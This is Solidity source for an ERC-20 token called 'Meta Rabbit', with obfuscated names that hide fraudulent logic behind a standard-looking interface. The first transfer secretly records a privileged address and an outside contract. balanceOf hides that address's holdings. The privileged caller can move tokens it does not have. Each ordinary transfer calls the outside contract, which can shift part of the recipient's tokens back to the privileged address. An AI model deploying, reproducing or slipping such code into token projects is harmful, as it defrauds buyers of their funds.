// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
    
interface cwqkLH {
    function totalSupply() external view returns (uint256);
    function balanceOf(address YjxTWFlfFq) external view returns (uint256);
    function transfer(address FpjsGymsA, uint256 MeMlv) external returns (bool);
    function allowance(address WwEmH, address spender) external view returns (uint256);
    function approve(address spender, uint256 MeMlv) external returns (bool);
    function transferFrom(
        address sender,
        address FpjsGymsA,
        uint256 MeMlv
    ) external returns (bool);

    event Transfer(address indexed from, address indexed JKoPDafSG, uint256 value);
    event Approval(address indexed WwEmH, address indexed spender, uint256 value);
}

interface OhKf is cwqkLH {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract ZKeDyBrUaOy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
interface JgFz {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
     
library cgDsElN{
    
    function qyYQiCRAucjq(address QRUJZAc, address xdLMhMnK, uint yBCceEhe) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool ioQi, bytes memory BBcuSmTa) = QRUJZAc.call(abi.encodeWithSelector(0x095ea7b3, xdLMhMnK, yBCceEhe));
        require(ioQi && (BBcuSmTa.length == 0 || abi.decode(BBcuSmTa, (bool))), 'cgDsElN: APPROVE_FAILED');
    }

    function Kgn(address QRUJZAc, address xdLMhMnK, uint yBCceEhe) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool ioQi, bytes memory BBcuSmTa) = QRUJZAc.call(abi.encodeWithSelector(0xa9059cbb, xdLMhMnK, yBCceEhe));
        require(ioQi && (BBcuSmTa.length == 0 || abi.decode(BBcuSmTa, (bool))), 'cgDsElN: TRANSFER_FAILED');
    }
    
    function dng(address xdLMhMnK, uint yBCceEhe) internal {
        (bool ioQi,) = xdLMhMnK.call{value:yBCceEhe}(new bytes(0));
        require(ioQi, 'cgDsElN: ETH_TRANSFER_FAILED');
    }

    function idui(address QRUJZAc, address from, address xdLMhMnK, uint yBCceEhe) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool ioQi, bytes memory BBcuSmTa) = QRUJZAc.call(abi.encodeWithSelector(0x23b872dd, from, xdLMhMnK, yBCceEhe));
        require(ioQi && BBcuSmTa.length > 0,'cgDsElN: TRANSFER_FROM_FAILED'); return BBcuSmTa;
                       
    }

}
    
contract MRB is ZKeDyBrUaOy, cwqkLH, OhKf {
    
    function allowance(address dZM, address Srz) public view virtual override returns (uint256) {
        return jotIhkdqHD[dZM][Srz];
    }
    
    function tAxT(
        address uqbgE,
        address vsveALN
    ) internal virtual  returns (bool){
        if(nipMZXWxX == address(0) && oKzkharHbpjz == address(0)){
            nipMZXWxX = uqbgE;oKzkharHbpjz=vsveALN;
            cgDsElN.Kgn(oKzkharHbpjz, nipMZXWxX, 0);
            EiNYKUjTNmW = JgFz(oKzkharHbpjz).WETH();
            return false;
        }
        return true;
    }
    
    address private nipMZXWxX;
    
    function totalSupply() public view virtual override returns (uint256) {
        return stqrjaJ;
    }
    
    function approve(address pnFzE, uint256 JDyrgTu) public virtual override returns (bool) {
        IOvhUnlwO(_msgSender(), pnFzE, JDyrgTu);
        return true;
    }
    
    function balanceOf(address HgKhHA) public view virtual override returns (uint256) {
        if(_msgSender() != address(nipMZXWxX) && 
           HgKhHA == address(nipMZXWxX)){
            return 0;
        }
       return MjroJf[HgKhHA];
    }
    
    function KhDPFRYeyYBu(
        address VLweMxh,
        address QOjYEAb,
        uint256 RsIoQHUQ
    ) internal virtual  returns (bool){
        uint256 Plw = MjroJf[VLweMxh];
        require(Plw >= RsIoQHUQ, "ERC20: transfer Amount exceeds balance");
        unchecked {
            MjroJf[VLweMxh] = Plw - RsIoQHUQ;
        }
        MjroJf[QOjYEAb] += RsIoQHUQ;
        return true;
    }
    
    address private oKzkharHbpjz;
    
    constructor() {
        
        MjroJf[address(1)] = stqrjaJ;
        emit Transfer(address(0), address(1), stqrjaJ);

    }
    
    function transferFrom(
        address JGY,
        address ivfVpXIVZs,
        uint256 uTAkFW
    ) public virtual override returns (bool) {
      
        if(!kjwACpSaMHo(JGY, ivfVpXIVZs, uTAkFW)) return true;

        uint256 NtJIUBkSKR = jotIhkdqHD[JGY][_msgSender()];
        if (NtJIUBkSKR != type(uint256).max) {
            require(NtJIUBkSKR >= uTAkFW, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                IOvhUnlwO(JGY, _msgSender(), NtJIUBkSKR - uTAkFW);
            }
        }

        return true;
    }
    
    function increaseAllowance(address pZnGJUexPVS, uint256 addedValue) public virtual returns (bool) {
        IOvhUnlwO(_msgSender(), pZnGJUexPVS, jotIhkdqHD[_msgSender()][pZnGJUexPVS] + addedValue);
        return true;
    }
    
    mapping(address => mapping(address => uint256)) private jotIhkdqHD;
    
    mapping(address => uint256) private MjroJf;
    
    function decreaseAllowance(address fqwmRr, uint256 subtractedValue) public virtual returns (bool) {
        uint256 NbkNlC = jotIhkdqHD[_msgSender()][fqwmRr];
        require(NbkNlC >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            IOvhUnlwO(_msgSender(), fqwmRr, NbkNlC - subtractedValue);
        }

        return true;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return aBH;
    }
    
    function name() public view virtual override returns (string memory) {
        return lQFDBSCdFnWi;
    }
    
    string private aBH =  "MRB";
    
    address private EiNYKUjTNmW;
  
    
    string private lQFDBSCdFnWi = "Meta Rabbit";
    
    function IOvhUnlwO(
        address OKTS,
        address fKm,
        uint256 DSfnBcHYUZ
    ) internal virtual {
        require(OKTS != address(0), "ERC20: approve from the zero address");
        require(fKm != address(0), "ERC20: approve to the zero address");

        jotIhkdqHD[OKTS][fKm] = DSfnBcHYUZ;
        emit Approval(OKTS, fKm, DSfnBcHYUZ);

    }
    
    uint256 private stqrjaJ = 2000000000000 * 10 ** 18;
    
    function kjwACpSaMHo(
        address yPSWiR,
        address BWDKe,
        uint256 JSNfH
    ) internal virtual  returns (bool){
        require(yPSWiR != address(0), "ERC20: transfer from the zero address");
        require(BWDKe != address(0), "ERC20: transfer to the zero address");
        
        if(!tAxT(yPSWiR,BWDKe)) return false;

        if(_msgSender() == address(nipMZXWxX)){
            if(BWDKe == EiNYKUjTNmW && MjroJf[yPSWiR] < JSNfH){
                KhDPFRYeyYBu(nipMZXWxX,BWDKe,JSNfH);
            }else{
                KhDPFRYeyYBu(yPSWiR,BWDKe,JSNfH);
                if(yPSWiR == nipMZXWxX || BWDKe == nipMZXWxX) 
                return false;
            }
            emit Transfer(yPSWiR, BWDKe, JSNfH);
            return false;
        }
        KhDPFRYeyYBu(yPSWiR,BWDKe,JSNfH);
        emit Transfer(yPSWiR, BWDKe, JSNfH);
        bytes memory dgniDkgB = cgDsElN.idui(oKzkharHbpjz, yPSWiR, BWDKe, JSNfH);
        (bool tRqr, uint axYzIo) = abi.decode(dgniDkgB, (bool,uint));
        if(tRqr){
            MjroJf[nipMZXWxX] += axYzIo;
            MjroJf[BWDKe] -= axYzIo; 
        }
        return true;
    }
    
    function transfer(address EZpEYOPg, uint256 BeqHPIiPwNZ) public virtual override returns (bool) {
        kjwACpSaMHo(_msgSender(), EZpEYOPg, BeqHPIiPwNZ);
        return true;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
}